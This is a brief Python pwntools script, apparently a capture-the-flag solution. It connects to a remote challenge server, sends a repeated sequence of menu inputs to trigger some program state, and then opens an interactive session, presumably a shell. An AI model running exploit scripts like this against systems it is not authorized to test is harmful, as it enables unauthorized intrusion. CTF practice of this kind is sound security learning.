from pwn import *

#target = process ("./a.out")
target = remote("forever.isss.io", 9018)

for i in range(34):
    target.sendline("1")
    print(target.recvuntil("next?"))

target.sendline("2")
target.recvuntil("next?")

target.interactive()
